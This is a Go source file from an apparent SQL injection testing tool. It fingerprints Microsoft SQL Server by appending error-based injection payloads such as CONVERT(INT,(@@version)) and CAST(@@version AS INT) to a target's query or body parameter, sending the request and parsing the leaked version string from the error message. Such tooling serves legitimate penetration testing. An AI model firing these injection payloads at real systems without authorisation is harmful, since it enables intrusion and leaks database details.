package fingerprint

import (
	"context"
	"strings"

	"github.com/0x6d61/sqleech/internal/engine"
	"github.com/0x6d61/sqleech/internal/transport"
)

// mssqlFingerprinter probes for MSSQL using version-extraction payloads.
type mssqlFingerprinter struct{}

func (f *mssqlFingerprinter) DBMS() string { return "MSSQL" }

func (f *mssqlFingerprinter) Fingerprint(ctx context.Context, req *FingerprintRequest) (*FingerprintResult, error) {
	// Try error-based: CONVERT(INT, @@version) leaks the version string.
	payloads := []struct {
		prefix, core, suffix string
	}{
		{"", "CONVERT(INT,(@@version))-- ", ""},
		{"'", "CONVERT(INT,(@@version))-- ", ""},
		{"", "CAST((@@version) AS INT)-- ", ""},
		{"'", "CAST((@@version) AS INT)-- ", ""},
	}

	for _, p := range payloads {
		if err := ctx.Err(); err != nil {
			return nil, err
		}

		payloadStr := req.Parameter.Value + p.prefix + " AND " + p.core + p.suffix
		probeReq := buildFingerprintRequest(req.Target, req.Parameter, payloadStr)
		resp, err := req.Client.Do(ctx, probeReq)
		if err != nil {
			continue
		}

		body := string(resp.Body)
		// MSSQL CONVERT error: "Conversion failed when converting the nvarchar value '<version>' to data type int."
		version := parseMSSQLConvertError(body)
		if version != "" {
			return &FingerprintResult{
				Identified: true,
				DBMS:       "MSSQL",
				Version:    normalizeVersion(version),
				Banner:     version,
				Confidence: 0.92,
			}, nil
		}
	}

	return nil, nil
}

// parseMSSQLConvertError extracts the value from a MSSQL type-conversion error.
func parseMSSQLConvertError(body string) string {
	// Pattern: Conversion failed when converting the nvarchar value 'VALUE' to data type int.
	lower := strings.ToLower(body)
	idx := strings.Index(lower, "conversion failed when converting")
	if idx == -1 {
		return ""
	}

	// Find the quoted value after "value '"
	sub := body[idx:]
	start := strings.Index(sub, "value '")
	if start == -1 {
		return ""
	}
	start += len("value '")
	sub = sub[start:]
	end := strings.Index(sub, "'")
	if end == -1 || end == 0 {
		return ""
	}
	return sub[:end]
}

// normalizeVersion extracts the major version from a MSSQL @@version string.
// e.g. "Microsoft SQL Server 2019 (RTM-CU18) 15.0.4261.1" → "2019 (15.0)"
func normalizeVersion(banner string) string {
	// Look for "SQL Server YEAR" pattern
	upper := strings.ToUpper(banner)
	for _, year := range []string{"2022", "2019", "2017", "2016", "2014", "2012", "2008", "2005"} {
		if strings.Contains(upper, "SQL SERVER "+year) || strings.Contains(upper, "SQL SERVER\n"+year) {
			return "SQL Server " + year
		}
	}
	// Try to extract version number like 15.0.xxx
	for _, prefix := range []string{"15.0", "14.0", "13.0", "12.0", "11.0", "10.50", "10.0", "9.0"} {
		if strings.Contains(banner, prefix) {
			return "SQL Server (" + prefix + ")"
		}
	}
	// Return the first line as a fallback
	lines := strings.SplitN(banner, "\n", 2)
	if len(lines) > 0 && len(lines[0]) > 0 {
		return strings.TrimSpace(lines[0])
	}
	return "unknown"
}

// buildFingerprintRequest creates a transport.Request for fingerprinting probes.
// Duplicated from helpers.go to keep mssql.go self-contained.
func buildFingerprintRequest(target *engine.ScanTarget, param *engine.Parameter, payloadStr string) *transport.Request {
	req := &transport.Request{
		Method:      target.Method,
		URL:         target.URL,
		Body:        target.Body,
		ContentType: target.ContentType,
	}
	if target.Headers != nil {
		req.Headers = make(map[string]string, len(target.Headers))
		for k, v := range target.Headers {
			req.Headers[k] = v
		}
	}
	if target.Cookies != nil {
		req.Cookies = make(map[string]string, len(target.Cookies))
		for k, v := range target.Cookies {
			req.Cookies[k] = v
		}
	}
	switch param.Location {
	case engine.LocationQuery:
		req.URL = modifyQueryParam(target.URL, param.Name, payloadStr)
	case engine.LocationBody:
		req.Body = modifyBodyParam(target.Body, param.Name, payloadStr)
	}
	return req
}
